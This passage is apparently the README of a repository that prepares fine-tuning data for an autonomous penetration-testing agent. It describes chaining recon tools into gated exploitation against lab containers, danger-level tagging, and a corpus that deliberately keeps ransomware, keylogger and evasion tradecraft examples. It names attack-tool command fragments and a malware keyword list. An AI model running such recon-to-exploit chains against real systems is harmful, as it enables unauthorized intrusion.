# Training data (qwen3:4b fine-tune prep)

Working materials for the planned `qwen3:4b` fine-tune (external, in Colab)
meant to teach the recon→exploit link-chain behavior this agent's live
Ollama models (BaronLLM/`pentest-agent`, `pentest-agent-alt`) struggle with —
see `mnemoria/` and `bd show kali-network-model-8jq` for the concrete,
live-verified gap this is meant to close.

## Pipeline-chain-building safety gate

`scripts/pipeline_chain_builder.py` is a separate offline harness (NOT a
REPL command, does not touch `agent.py`'s live `engage`/`run_attack_loop`
path at all) for generating more real, live-verified multi-turn examples
by actually running stage-1 (recon/enumeration/identification) tools
against the lab, piping/tee-ing their real output into a follow-on stage-2
(credential attack / exploit-craft / exploit-deploy) step. It's gated by
`CONFIG.ALLOW_FULL_PIPELINE_CHAINS` (`.env`, default `false`): a recipe's
stage-1 step(s) always run for real; stage 2 only runs if that flag is
explicitly set true, otherwise the harness stops at the boundary and
records a stage-1-only row (`stage_2_blocked_pending_override: true`) —
"it's fine to string enumeration straight into exploitation against a
local known-vulnerable lab container, but that has to be an overt,
deliberate opt-in, never a default that could also fire against something
that isn't actually the authorized lab." Output goes to
`pipeline_chains_generated.jsonl`, reviewed by hand before being added to
`merge_scripts_format.py`'s `SOURCES` list — not auto-merged. **Now wired
in**: the seed `naabu_nuclei_pipe_live` recipe's live run against
`kali-agent-box` is in the merge as of this pass (1 row after dedup — it
was run twice, once with the override off and once on, both times taking
the identical recon-only path since this recipe has no `stage_2`).

### Template-generated recipes, and farming this out across machines

Hand-authoring one concrete recipe at a time doesn't scale to the ~60-70%
multi-turn target (see Known Gaps). `scripts/pipeline_recipes.py` now
holds TEMPLATES instead: one validated (or candidate) skeleton plus a
`variations` list of parameter substitutions, expanded at runtime into
many concrete recipes (`{template_id}__v{n}`) by
`pipeline_chain_builder.py`. A template's `verified` field is honesty
bookkeeping, not a gate — `True` (this exact chain ran clean this
session), `"components_only"` (every sub-step proven elsewhere, not yet
re-run as this exact chain), or `False` (a plausible candidate, not yet
run at all). Unverified templates are deliberately included, not
withheld: the harness now tracks real failures (`stage_1_failed`) as
legitimate negative training signal instead of discarding them, so an
untested template "failing informatively" when actually run is useful,
not wasted. Confirmed this pass: `nmap_vuln_script_searchsploit` and
`httpx_nuclei_pipe` (both previously `False`/`components_only`) ran clean
on first live try; `naabu_nuclei_pipe_dast` (`-dast -t dast/http/`)
produced a real `command_failed` — kept in `pipeline_chains_generated.jsonl`
for review, correctly excluded from the trusted merge.

New CLI: `--list` (print candidates without running), `--limit N`,
`--filter SUBSTRING`, `--verified-only`, `--shuffle`, `--out PATH`,
`--targets-file PATH`. The `--out`/`--shuffle` pair is the farming
mechanism: point a different machine's `.env` at its own Kali target, run
`pipeline_chain_builder.py --shuffle --out machineN_output.jsonl` there
independently, copy the output file back, then run
`scripts/merge_pipeline_chain_outputs.py machineN_output.jsonl [...]`
once to dedupe everything into the canonical
`pipeline_chains_generated.jsonl` — no need to labor over every step in
one session when the same candidate list can run unattended on multiple
machines in parallel.

#### Running this on a genuinely separate machine

Two problems with just cloning the whole repo everywhere: (1) each
machine needs its own `.env` (different `EXEC_MODE`/`SSH_HOST`/target),
and running several from one shared checkout means constantly
re-exporting a different `.env` into the same shell; (2) the recipes'
hardcoded `172.x.x.x` targets are this repo's own docker-lab addresses —
meaningless on a different network.

**Minimal standalone bundle** (`scripts/make_farm_bundle.sh`) — packages
only what the harness actually needs to run: `config.py`, `tools.py`,
`remote_exec.py`, `requirements.txt`/`pyproject.toml`, `.env.example`, and
`training-data/scripts/{pipeline_chain_builder,pipeline_recipes,
dataset_taxonomy,merge_pipeline_chain_outputs}.py` — deliberately NOT the
committed dataset jsonl files or the merge/export scripts, which a
farming machine never runs. Preserves the exact relative directory
structure `pipeline_chain_builder.py`'s `sys.path` manipulation expects,
so it runs standalone with zero code changes — confirmed by actually
unpacking it into `/tmp` and running `--list`/`--filter` against a real
override file this pass. Usage:

```bash
training-data/scripts/make_farm_bundle.sh pipeline-farm-bundle.tar.gz
# on the target machine, in its own custom directory:
tar xzf pipeline-farm-bundle.tar.gz -C /path/to/custom-dir && cd /path/to/custom-dir
uv venv && uv pip install -r requirements.txt   # or pip install -r requirements.txt
cp .env.example .env && vi .env                  # this machine's own config
cp training-data/scripts/pipeline_targets.example.json training-data/scripts/pipeline_targets.json
vi training-data/scripts/pipeline_targets.json    # remap targets to what THIS machine can reach
set -a && source .env && set +a
python3 training-data/scripts/pipeline_chain_builder.py --shuffle --out my_output.jsonl
```
Then copy `my_output.jsonl` back to the main checkout and run
`merge_pipeline_chain_outputs.py my_output.jsonl`.

**Target overrides** (`--targets-file`, default
`training-data/scripts/pipeline_targets.json`, gitignored like `.env`) —
a JSON file keyed by the same `{template_id}__v{n}` pathway name,
`{"field": "override_value"}` per entry, merged into that variation's
values BEFORE template substitution (applying it after substitution would
leave the OLD target baked into the already-formatted command string, so
this has to happen at the right layer — see `expand_templates()`'s
docstring). Confirmed live this pass: overriding
`naabu_nuclei_pipe__v0`'s target actually changes the printed/generated
command, not just a label. `pipeline_targets.example.json` ships in the
bundle as the template to copy and fill in.

**Machine3 (the networked, non-Docker Kali box)** needs no code changes
at all — `remote_exec.py`'s `EXEC_MODE=direct` path already SSHes
straight to `SSH_USER@SSH_HOST` and runs the command on that box's own
shell; `docker exec` only ever happens for `EXEC_MODE in ("docker",
"local_docker")` (confirmed by reading `_build_remote_command`/`run()`).
Just set `EXEC_MODE=direct`, `SSH_HOST`, `SSH_USER`, `SSH_KEY_PATH` in
that machine's `.env` and a `pipeline_targets.json` pointing at real hosts
on its own network.

One rough edge from this refactor, not yet cleaned up: the two original
hand-authored pathway names (`naabu_nuclei_pipe_live`,
`masscan_nmap_searchsploit_chain`) don't match the new
`{template_id}__v{n}` naming their template-generated equivalents use, so
they show up as separate pathways in the merged corpus even though
they're testing near-identical skeletons. Harmless for data integrity
(each row is still a real, correctly-tagged example), just a naming
inconsistency worth a rename pass later.

### The three-way scope: `recon_only` / `exploit_authorized` / `exploit_conditional`

`exploit_conditional` sits between the other two, and it works
**differently** from both rather than just being a third label:

- `recon_only` has a hard, deterministic runtime backstop (`agent.py`'s
  `_is_recon_safe_step`/`RECON_ONLY_BLOCKED_TOOLS`) — it blocks specific
  tool names outright, which a simple set-membership check can enforce
  perfectly.
- `exploit_authorized` is a blanket green light, gated only by
  `CONFIG.ALLOW_FULL_PIPELINE_CHAINS` — the flag is the whole check.
- `exploit_conditional` means "stage 2 is authorized **only if** a
  specific, named condition is true of what stage 1 actually found" —
  e.g. a real engagement scoped to "you may demonstrate the SQL injection
  you find, but don't attempt credential brute force against anything
  else." This is arguably the *more realistic* case — real Rules of
  Engagement are almost always conditionally scoped, not a blanket yes/no.

Whether that's enforceable, not just labelable, is the real question, and
the honest answer is: **only partially**, and only because the mechanism
here is deliberately narrow. `pipeline_chain_builder.py` recipes can set a
`condition_check` regex; stage 2 then requires BOTH
`ALLOW_FULL_PIPELINE_CHAINS=true` AND a real match of that regex against
stage 1's actual captured output — not just "the flag happens to be set."
This works because the condition is a simple pattern match against real
text. It does **not** generalize to arbitrary natural-language conditions
("only if the CVE looks recent," "only against externally-facing
services") — that's a judgment call a regex can't make, which is exactly
why `recon_only` gets a hard tool-level gate and this doesn't. Its real
value is as a **training-data construct**: matched-pair examples (same
recon finding, `exploit_authorized` in one row escalates unconditionally,
`exploit_conditional` in another row escalates only when the stated
condition is actually met, refuses/reports otherwise) teach the model that
authorization comes from what was *stated*, not from what's merely
*possible* — a stronger signal than isolated examples of either behavior
alone.

### Tools vs. dataset: efficiency and breadth are different goals, kept separate

Explicit design principle, not an oversight: **production code
(`SYSTEM_PROMPT`, the "preferred pathway" framing, any future tool-
selection guidance) should always steer toward the single most efficient
path for a given situation** — e.g. `nmap --script vuln,http-enum` over a
bare `-sV`, because it's simply the better default. **The training
dataset's job is the opposite: maximum breadth of correct-but-not-
necessarily-optimal variations** (see `converted_nmap_capped.jsonl`'s
enormous flag diversity) so the model has seen enough syntax variety to
be robust, not just efficient. A dataset row using a legitimate but
sub-optimal flag combination is not a bug to clean up — don't filter the
corpus down to "only the best way to do X," or the breadth this corpus
exists to provide disappears.

### Real massaging gotchas found this pass (live-tested, one stage at a time)

Building the `masscan_nmap_searchsploit_chain` recipe (masscan sweep →
awk-extracted `host:port` list → per-host `nmap -sV` service ID → a second
awk/sed normalization pass → `searchsploit`) against the real
InfoSecWarrior stack (172.25.0.2–.7 via `kali-agent-box`) surfaced several
concrete "massaging" requirements — worth generalizing to any future
chain that strings together tools not normally used back-to-back:

- **`masscan -oG`'s format is NOT the same shape as `nmap -oG`**: one
  `Timestamp:\tHost: <ip> ()\tPorts: <port>/open/...` line **per open
  port**, not all of a host's ports comma-joined on one line the way
  `nmap -oG` does it. A massaging step written against nmap's format will
  silently mis-parse masscan's.
- **`docker exec`'s default working directory is `/`, not `/tmp` or
  `$HOME`** — a relative filename in a `tee`/`&&` chain lands wherever
  that default is, not where you'd expect from an interactive SSH session.
  Always use absolute paths (`/tmp/...`) in any chained `run_command`
  string that writes an intermediate file for a later stage to read.
- **`masscan`'s live status line can visibly count into *negative*
  seconds** ("waiting -19-secs") in this containerized network — looks
  exactly like a hang. It isn't: the process completes and writes a
  correct, complete output file regardless; the countdown display is
  cosmetic noise from a non-TTY `docker exec` context. `--wait 0` avoids
  the confusing display (this is itself worth a documented negative
  example — a naive "did the command hang" check on this output text
  would be wrong).
- **A raw `nmap -sV` version string needs normalization before
  `searchsploit` returns anything**: `"Apache httpd 2.4.7 ((Ubuntu))"`
  returns zero results; `"Apache 2.4.7"` (strip the parenthetical OS tag
  and the generic `httpd`/`smtpd`/`pop3d`/`imapd` daemon-name suffix)
  returns real matches. Confirmed live across the whole stack: `vsftpd
  3.0.3`, `Apache 2.4.6/2.4.7/2.4.57` all returned real exploit-db hits
  after normalization; `OpenSSH 9.2p1`, `MariaDB 5.5.5-10.5.23`, `Jetty
  10.0.20` are genuine, current, patched versions with real 0-result
  negatives (not a normalization failure — worth keeping as honest
  negative examples). A bare service name with no version at all
  (`Postfix`, `Dovecot` — nmap's probe didn't return a version) still
  returns *some* searchsploit hits, but old/generic/low-relevance ones —
  worth flagging in training data as "a version-less query is a weaker
  signal, not a wasted one."

## Gold-standard plan: two exported formats

This corpus is built once, from the same underlying reviewed rows, into
**two** deliberately different exports — one for this repo's own use, one
for anyone/anything else:

1. **`combined_scripts_format.jsonl`** (`scripts/merge_scripts_format.py`)
   — the exact shape `agent.py`'s own prompts produce and `tools.py`'s
   `ToolExecutor` consumes: `{"goal", "chain": [{"tool": ..., <params>}],
   "scope", "pathway", "turn", "source"}`, nothing extra. This is "the
   prefix each module expects" — kept intentionally clean so it stays a
   drop-in fit for this repo's own fine-tune/eval scripts. Every `chain[].tool`
   is validated against the real `tools.SUPPORTED_TOOLS` (imported, not
   hand-copied) before a row is admitted.
2. **`combined_chatml_format.jsonl`** (`scripts/export_chatml_format.py`)
   — a portable, harness-agnostic `{"messages": [...], "metadata": {...}}`
   export with no `run_*`/`tools.py`-specific assumptions, meant to be
   usable outside this repo (a different fine-tune target, a dataset audit,
   handing it to someone who never heard of this agent). `metadata` carries
   `scope`, `pathway`, `source`, `turns`, `threading_confidence`, and the
   danger-level/safeguard tags below — so a downstream consumer can filter
   by risk without re-deriving it from raw tool params.

Both are regenerated from the **same** already-deduped, tool-validated row
set (`combined_scripts_format.jsonl` is the ChatML script's input), so they
never drift against each other. Run `merge_scripts_format.py` before
`export_chatml_format.py` if either source file changes.

**Format/target-model variance is explicitly deferred**: the exact
danger-level cut points, which safeguard tags a given downstream consumer
cares about, and whether a different target model wants a different chat
template are all real open questions this plan does not try to settle —
see "Known gaps" below. What's built now is the *mechanism* (a shared
tagger, a clean two-format split) so those decisions can be made later
without re-deriving the merge/dedup/validation pipeline.

### Danger-level taxonomy (`scripts/dataset_taxonomy.py`)

First-pass, **rule-based, not hand-reviewed** — see the module docstring
for exact matching logic and known mis-tag risk before trusting a specific
row's tag.

| Level | Name | Meaning | Example tools/markers |
|---|---|---|---|
| 0 | `passive_recon` | read-only discovery, no state change | `run_nmap`, `run_naabu`, `run_masscan`, `run_netstat` |
| 1 | `active_enumeration` | noisier but still read-only probing | `run_gobuster`, `run_nikto`, `run_nuclei`, `run_ffuf`, `run_enum4linux`, `run_searchsploit` |
| 2 | `authenticated_access` | uses a found credential/session, no destructive payload | authenticated `run_curl`/`run_sqlmap` with a real `cookie` |
| 3 | `active_exploitation` | code execution, injection w/ data change, credential brute force/cracking | `run_hydra`/`run_john`/`run_ncrack`/`run_medusa`, `sqlmap --dump`/`--os-shell`, `metasploit use/run`, RCE payload markers |
| 4 | `destructive_or_evasive` | malware/persistence/evasion tradecraft | ransomware/keylogger/rootkit/backdoor/persistence keyword hits |

`safeguards` (additive tags): `authorized_lab_only` (true of the whole
corpus today), `live_verified` (chain actually executed against a real
target, output captured), `unverified_outcome` (source-flagged
`reviewed: false`), `requires_cleanup_step`, `credential_material` (chain
embeds a real-looking cookie/nonce/token — scrub before any external
sharing), `tradecraft_sensitive` (level-4 content).

Current tag distribution over `combined_chatml_format.jsonl` (1182
conversations, after wiring in `pipeline_chains_generated.jsonl` and the
`cve_conditional_exploit` matched pair): 128 `passive_recon`, 806
`active_enumeration`, 2 `authenticated_access`, 194 `active_exploitation`,
52 `destructive_or_evasive`. `live_verified` is now 17 (was 8) —
`logs_failure_recovery` and `pipeline_chain_builder` weren't
being matched (the code checked source `"logs"`, which never actually
occurs; the real value is `"logs_failure_recovery"` — fixed in the same
pass). (An earlier pass under-counted
`active_exploitation` at 59 — `_LEVEL3_TOOLS`/`_EXPLOIT_MARKER_RE` only
matched a *structured* `tool` field or a narrow flag/payload regex, so a
credential-attack/exploit binary invoked as raw text inside a
`run_command` string — 84% of the corpus is `run_command`-wrapped — went
undetected: confirmed live via an evaluation pass this session that
`hydra ... http-post-form`, `mimikatz lsadump::dcsync ...`,
`aircrack-ng capture.cap`, and `setoolkit -t 1 -a 3 ...` were all
mis-tagged `active_enumeration`. Fixed by adding `_EXPLOIT_TOOL_NAME_RE`,
matched against the raw command text too, and adding `run_setoolkit` to
`_LEVEL3_TOOLS`, which it was missing from entirely.) The 52
destructive/evasive rows are all from
`baseline_cleaned` (the deliberately-kept tradecraft subset below) — worth
independently confirming nothing else in the corpus should carry that tag,
since the regex list is a starting keyword set, not exhaustive (e.g. it
won't catch "trojan", "C2"/"command and control", "exfiltrate", or a
persistence technique described without any of the listed nouns).

### Multi-turn threading — only where verified sequential

Only two sources have a **verified** sequential turn structure: `playbook`
(`playbooks/dvwa_full_chain.sh`, one continuous pathway, turns 1–6) and
`exports` (mined directly from a real session transcript, turns sequential
within a pathway). Everything else (`pathway_generator`,
`baseline_cleaned`, `nmap_commands`, `logs_failure_recovery`) is exported
as an **independent single-turn sample** even where its own `turn` field is
>1 — confirmed by inspection that e.g. `generated_pathways.jsonl`'s
`authenticated_sqli` pathway has six rows *all* at `turn=2` with no
`turn=1` companions: `turn` there means "this example simulates the shape
of round N's prompt", not "these rows chain into one conversation".
Grouping those by pathway would have silently fabricated conversations
that never happened — `combined_chatml_format.jsonl`'s
`metadata.threading_confidence` field (`verified_sequential` vs.
`independent_sample`) makes this explicit per row rather than leaving it
implicit. `VERIFIED_SEQUENTIAL_PATHWAYS` (a per-pathway allowlist, not a
blanket source rule) is the escape hatch for a pathway that IS genuinely
sequential despite living in a mostly-independent-samples source file —
`cve_conditional_exploit` (below) is the first case. Today: 11
verified-sequential multi-turn conversations (27 turns) vs. 1171
independent single-turn samples.

## Pipeline

```
raw_kali_pentest_data.jsonl  --(scripts/[implicit filter])-->  baseline_cleaned.jsonl
                                                                        │
                                          scripts/convert_baseline.py  ▼
                                                          converted_baseline.jsonl  ──┐
raw_nmap_commands.jsonl  --scripts/convert_nmap.py-->  nmap_cleaned_full.jsonl        │
                                          (random.seed(20260918) sample) │            │
                                                     converted_nmap_capped.jsonl ─────┤
                                                                                       │
                            scripts/build_pathways.py  ──>  generated_pathways.jsonl ─┤
                                                                                       │
                             scripts/build_playbook.py  ──>  playbook_dvwa.jsonl  ────┤
                                                                                       │
                          exports/*.md mining forks  ──>  exports_transcript{1,2}_extracted.jsonl ─┤
                                                                                       │
                      scripts/build_failure_recovery.py  ──>  failure_recovery.jsonl ─┤
                                                                                       │
              scripts/pipeline_chain_builder.py (live, against the lab)  ──>  pipeline_chains_generated.jsonl ─┤
                                                                                       ▼
                                                        scripts/merge_scripts_format.py
                                                                                       │
                                                                     combined_scripts_format.jsonl
                                                                                       │
                                                          scripts/export_chatml_format.py
                                                                                       ▼
                                                                      combined_chatml_format.jsonl

                               scripts/extract_logs.py  ──>  logs_extracted_UNREVIEWED.jsonl (needs curation first, excluded from the merge)
```

Every generated file uses the same target schema: `{"goal": <exact prompt
text>, "chain": [{"tool": ..., <params>}], "scope": "recon_only" |
"exploit_authorized" | "exploit_conditional" | null, "pathway": <name> |
null, "turn": <int>, "source": <which script/file this came from>}`.
`goal` is built from the EXACT string templates
`agent.py`'s `run_attack_loop`/`run_recon_only_loop`
construct at runtime (see `scripts/build_pathways.py`'s helper functions) —
deliberate, so the fine-tune sees the identical prompt shape it will
actually be run against.

## Files

- `raw_kali_pentest_data.jsonl` — the user's custom dataset (1224 examples,
  `{"instruction": ..., "response": <bare shell command>}`), untouched.
  Meaningfully more accurate than the public `suryanshp1/kali-linux-pentesting-data`
  set previewed earlier in `mnemoria/` (e.g. correct hydra `-l`/`-P`/`-t`
  flag semantics and correct `http-post-form`/`http-get-form` field syntax,
  where the public set had both backwards).
- `baseline_cleaned.jsonl` (1000 examples) — `raw_kali_pentest_data.jsonl`
  with two mechanical filters: dropped 175 non-English (Farsi) instructions
  (agent's `SYSTEM_PROMPT`/goals/params are always English), deduped 49
  exact repeats. **Explicitly did NOT filter out** the ~117 examples
  covering ransomware/keylogger/rootkit/EDR-evasion/persistence tradecraft
  — kept per an explicit user decision (this is a closed, already-scoped
  authorized lab environment, not a public default). Tagged
  `destructive_or_evasive`/`tradecraft_sensitive` in the ChatML export so a
  downstream consumer can filter it back out.
- `converted_baseline.jsonl` (1000 examples, `scripts/convert_baseline.py`)
  — `baseline_cleaned.jsonl` wrapped into chain-schema shape. **Design
  choice, stated explicitly**: every response is wrapped as a single
  `run_command` step verbatim, not parsed into structured per-tool params
  — parsing 1000 heterogeneous real command lines into ~25 tools' exact
  field shapes risks silently mangling a working command into a subtly
  wrong one, exactly the class of bug this whole project has been finding.
  `scope` is left `null` — this dataset wasn't authored with the
  `recon_only`/`exploit_authorized` taxonomy in mind (see
  `kali-network-model-bdu`) and guessing wrong is worse than leaving it for
  a follow-up classification pass.
- `raw_nmap_commands.jsonl` (1133 examples, `{"input", "output"}`) — the
  user's nmap-only dataset (originally referred to as a "Spanish-translated
  nmap dataset" in an earlier planning pass — confirmed to be this single
  file: ~19/1133 rows are genuinely Spanish-language `input` text mixed
  into an otherwise-English set, not a separate translated corpus. That
  open thread is closed — there is no second nmap file to expect.
- `nmap_cleaned_full.jsonl` (1108 examples, `scripts/convert_nmap.py`) —
  parsed into **structured** `run_nmap` params (`target`/`flags`), safe to
  do here (unlike `convert_baseline.py`) since every row is the same one
  tool. Drops non-ASCII `input` rows (removes the Spanish-language subset
  above) and exact repeats.
- `converted_nmap_capped.jsonl` (100 examples, `random.seed(20260918)`
  sample of the above) — nmap recon is 1 of ~10 canonical pathways in this
  corpus, so the full 1108-row set would dominate the merge purely by
  volume; capped to roughly the same order of magnitude as the other
  pathway sources. **This is the file the merge actually uses** —
  `nmap_cleaned_full.jsonl` is kept separately in case more is wanted later.
- `generated_pathways.jsonl` (66 examples, `scripts/build_pathways.py`) —
  hand-authored, parametrized variations around the 10 canonical
  recon/exploit pathways from this session's design discussion, using
  **structured per-tool params** (unlike `converted_baseline.jsonl`).
  Every skeleton command was either run live this session against a real
  target or copied unmodified from `playbooks/dvwa_full_chain.sh`. Includes
  **matched recon_only/exploit_authorized pairs** and honest dead-end/
  give-up examples (empty-chain responses, not busywork). `turn` is a
  *simulated round-shape* label per example, not a conversation index —
  see "Multi-turn threading" above. **Exception**: the `cve_conditional_exploit`
  pathway (4 rows, added this pass) IS genuinely sequential — two real
  matched pairs (`172.17.0.12`: condition met, escalates via a real
  matched CVE/module; `172.25.0.4`: condition not met, a current patched
  version with no exploit match, correctly stops with an empty chain) —
  listed in `export_chatml_format.py`'s `VERIFIED_SEQUENTIAL_PATHWAYS`.
- `playbook_dvwa.jsonl` (6 examples, `scripts/build_playbook.py`) — the
  highest-confidence source in the corpus: `playbooks/dvwa_full_chain.sh`'s
  manually-verified techniques, re-encoded as one continuous multi-turn
  `exploit_authorized` sequence with real prior-round history at each turn.
  Only 6 of the playbook's 10 techniques are converted so far (XSS/CSRF/
  weak-session-id/blind-SQLi remain — same pattern, not yet done).
- `exports_transcript1_extracted.jsonl` (1 example) and
  `exports_transcript2_extracted.jsonl` (18 examples) — mined directly from
  the two committed session transcripts by background forks. Covers real,
  live-verified pathways: Shellshock CVE-2014-6271 RCE, WordPress weak-
  creds→theme-editor RCE, anonymous-FTP social-engineering lead, SNMP
  community-string disclosure, a Jenkins CVE honest-negative, vhost
  Host-header discovery, and a credential-reuse-campaign honest-negative.
  2 of the 18 WordPress rows are `reviewed: false` — real captured
  cookie/nonce values (not fabricated placeholders — that was checked and
  ruled out), but the actual webshell write + RCE + restore was never
  independently confirmed end-to-end in that pass; excluded from the merge
  until that's closed out. See "Known gaps".
- `failure_recovery.jsonl` (7 examples, `reviewed: true`,
  `scripts/build_failure_recovery.py`) — real captured tool-failure
  messages from `logs/*.json` sessions, each paired with a manually-
  verified correct fix (wrong param names, wrong wordlist paths, a
  hallucinated wordlist value). Every row `reviewed: true` — this IS ready
  to train on, unlike the raw extraction below.
- `logs_extracted_UNREVIEWED.jsonl` (95 examples, `scripts/extract_logs.py`)
  — **not ready to train on, excluded from the merge**. Real `(goal, chain,
  real_outcomes)` triples mechanically pulled from every `logs/*.json`
  session, `reviewed: false` on every row — this is what the model
  *actually* said historically, including its own known mistakes (the
  `login.php?id=1` few-shot contamination, the malformed `http-post-form`
  attempt). `real_outcomes` is preserved per row so a reviewer can filter/
  correct before merging.
- `pipeline_chains_generated.jsonl` (4 merge-eligible rows, 5 raw —
  `scripts/pipeline_chain_builder.py` + `scripts/pipeline_recipes.py`'s
  templates, deduped by `scripts/merge_pipeline_chain_outputs.py`) — real
  output against `kali-agent-box`: the original hand-authored
  `naabu_nuclei_pipe_live`/`masscan_nmap_searchsploit_chain` rows, plus
  template-generated `nmap_vuln_script_searchsploit__v0` and
  `httpx_nuclei_pipe__v0` (both ran clean on first live try) and
  `naabu_nuclei_pipe_dast__v0` (a real `command_failed` — kept for review,
  excluded from the merge via `stage_1_failed`). All entirely stage-1/
  identification so far. **Still no structured `run_naabu`/`run_masscan`/
  `run_searchsploit` calls** — every merge-eligible row is a `run_command`
  shell pipe, not a structured tool call; the two-stage templates that
  WOULD produce structured `run_hydra`/`run_gobuster`/`run_sqlmap` rows
  are drafted in `pipeline_recipes.py` but not yet run with the override.
- `combined_scripts_format.jsonl` (1200 examples, `scripts/merge_scripts_format.py`)
  — the deduped, tool-name-validated merge of every *reviewed* source above
  (excludes `logs_extracted_UNREVIEWED.jsonl` entirely, the 2 unreviewed
  WordPress rows, and any `stage_2_blocked_pending_override`/
  `stage_1_failed` row). 0 cross-file exact duplicates on this pass — every
  source is disjoint by construction (within-file dedup already happened
  in each source's own build script, or in
  `merge_pipeline_chain_outputs.py` for the pipeline-chain rows).
- `combined_chatml_format.jsonl` (1184 conversations, `scripts/export_chatml_format.py`)
  — the ChatML/general-purpose export of the same merged rows, with
  danger-level/safeguard tags and verified-vs-independent turn threading.

## The vulhub pivot: on-demand known-CVE targets, not an always-on lab stack

The lab targets moved from an always-on `docker-compose.yml` stack
(`~/Offensive-Pentesting-Lab/docker-compose.yml` -- infosecwarrior FTP/web/
mysql/snmp/smtp, a WordPress+db pair, a few vulhub images wired in by hand)
to `training-data/scripts/vulhub_lab.py`, an on-demand launcher for
vulhub's 333 per-CVE `docker-compose.yml` environments (a git clone at
`~/Offensive-Pentesting-Lab/vulhub`, override the path via `VULHUB_ROOT`).
Two real problems drove this:

1. **Resources.** The always-on stack plus repeated vulhub image builds
   left Docker holding 108GB of images / 47.9GB of reclaimable build cache
   at the time of the pivot (`docker builder prune -f` recovered 7GB of
   that safely; the remaining ~49GB is images, left alone since some may
   belong to unrelated projects on the same machine).
2. **"Shooting in the dark."** The old stack's tool-testing had no ground
   truth -- recipes ran against whatever happened to be listening, with no
   documented expected finding to check output against. Every vulhub CVE
   directory ships a real README describing the exact vulnerability, so
   `vulhub_lab.py info <app>/<CVE>` gives an actual baseline to verify a
   tool's output against, not just "did it run without erroring."

**Usage**: `vulhub_lab.py list [filter]` / `info <app>/<CVE>` / `up
<app>/<CVE> [--for-pathway PATHWAY[,...]] [--container NAME]` / `down
<app>/<CVE>` / `down --all` / `status`. Bring up exactly one (or a few,
deliberately) at a time -- this is the resource-saving model the tool was
built around, not a limitation to work around. `up` handles a real gotcha
automatically: `DOCKER_CONTAINER` (from `.env`) is explicitly attached to
several existing lab networks by hand (confirmed via `docker inspect`) --
it is NOT simply "on the default bridge and can reach everything." Every
new vulhub CVE directory creates its own isolated project network with
zero route to it otherwise; `up` discovers the real network(s) via `docker
inspect` (never guessed from compose's project-name-mangling rules) and
connects `DOCKER_CONTAINER` to each one. `down` disconnects it FIRST --
confirmed live that skipping this leaves compose's own network-removal
step failing silently ("Resource is still in use") and an orphaned network
behind forever.

**The dynamic-IP bridge**: vulhub containers get a fresh IP every time
they're brought up, unlike the old stack's fixed addresses. `up
... --for-pathway PATHWAY[,...]` writes that real, current IP straight
into `pipeline_targets.json` (the same per-machine target-override
mechanism farming already used) -- `pipeline_recipes.py`'s own baked-in
`target` defaults are now only ever placeholders from whenever a recipe
was last verified, never trust them across a restart. Run `vulhub_lab.py
up` again and re-check `pipeline_targets.json` before assuming any recipe's
target is actually live.

**What replaced what** (all live-verified this session, not just wired up):
- WordPress-targeting recipes (`katana_crawl_wordpress`, `ffuf_wordpress_fuzz`,
  `gobuster_dir_xargs_curl_head`, `nmap_open_grep_xargs_ffuf`,
  `web_login_discovery_hydra_chain__v0`, plus several `naabu_nuclei_pipe`/
  `httpx_nuclei_pipe`/`nmap_vuln_script_searchsploit`/`naabu_nuclei_pipe_dast`
  variations that used to point at the old stack's generic web server or
  WordPress container) → `wordpress/CVE-2026-63030` ("wp2shell" -- confirmed
  via matching site title AND identical `vulhub/wordpress:6.9.4` image tag
  that this is likely the SAME underlying environment the old stack's `web2`
  service was already running, just launched properly now).
- `masscan_nmap_searchsploit_chain`'s 3 variations, previously blind subnet
  sweeps (`172.25.0.2-.7`, `172.26.0.2-.4`, `172.23.0.0/24`) → 3 single
  known hosts: `tomcat/CVE-2017-12615` (real Apache Tomcat 8.5.19 banner,
  searchsploit correctly found 2 real matching exploit-db entries),
  `php/CVE-2019-11043` (real nginx 1.31.6 banner, searchsploit correctly
  found NO results -- an honest negative, the actual CVE is in PHP-FPM's
  request parsing, invisible to a banner grab against nginx), `struts2/s2-045`
  (real Jetty 9.2.11.v20150529 banner -- this vulhub image bundles Struts2
  on embedded Jetty, not Tomcat; corrected after actually running it, not
  assumed -- searchsploit correctly found NO results, same honest-negative
  reasoning). A blind multi-host sweep was exactly the "shooting in the
  dark" pattern this whole pivot exists to move away from, so these were
  retargeted to single known hosts rather than preserved as ranges.
- SNMP/SMTP-targeting variations (parts of `naabu_nuclei_pipe`/
  `httpx_nuclei_pipe`) were REMOVED outright, not retargeted -- see Known
  Gaps below, SNMP/SMTP are out of scope entirely now, and vulhub has no
  non-web-app catalog to replace them with anyway.
- `ftp_anon_medusa_chain`/`ftp_anon_ncrack_chain` are RETIRED (a `retired:
  True` flag on the template, excluded from `all_recipes()` by default,
  logic kept in the file rather than deleted) -- vulhub is a per-CVE
  software-vulnerability catalog, not a misconfiguration-lab catalog, and
  anonymous FTP access is a config weakness, not a CVE (confirmed: no
  ftp/vsftpd/proftpd directory exists anywhere in vulhub). Un-retire by
  pointing `variations` at a real anonymous-FTP host again if one comes
  back (e.g. on a separate personal-network lab).
- `dvwa_commix_exec_chain`/`dirb_recon`/`nmap_sV_grep_field_searchsploit`/
  `nmap_sV_multiport_field_searchsploit`/`web_login_discovery_hydra_chain__v1`/
  several `naabu_nuclei_pipe`/`httpx_nuclei_pipe`/`nmap_vuln_script_searchsploit`
  variations all target DVWA, which is untouched by the vulhub pivot itself
  (it's a standalone `docker run` container, not part of the retired compose
  stack) -- but its IP moved (`172.17.0.12` → `172.17.0.2`) after an
  unrelated restart during this same session, and its database needed
  re-initializing (see `bd memories gotcha-dvwa-needs-setup-after-restart`)
  before login worked at all. Both are now reflected via `pipeline_targets.json`
  the same way as the vulhub targets -- DVWA's IP isn't actually any more
  stable than a vulhub container's, it just happens to persist across a
  single uptime period rather than every relaunch.

## `wp2shell_full_chain`: one full web app, walked end to end

The multi-turn ratio gap below (<1% vs. a 60-70% target) is this corpus's
single biggest problem, and every recipe up to this point only ever exercised
a narrow slice of a target (one FTP misconfig, one DVWA login form). This
template is the first genuine end-to-end trajectory against one real, fairly
complex web app, walked the way a human pentester actually works a target:
connectivity verification → directory/file/hidden-content enumeration →
form/parameter discovery → (gated) sqlmap + credential fuzzing + nuclei CVE
scan + commix (with its real `--msf-path` Metasploit hand-off) + searchsploit
+ a metasploit module search.

**Target**: `wordpress/CVE-2026-63030` ("wp2shell") -- picked over
Drupalgeddon2 (no db service), phpMyAdmin (the target IS a db tool, not a
business app), a bare Django SQLi route (single endpoint, not a real
multi-page app), and Magento/Joomla (narrower tooling coverage) specifically
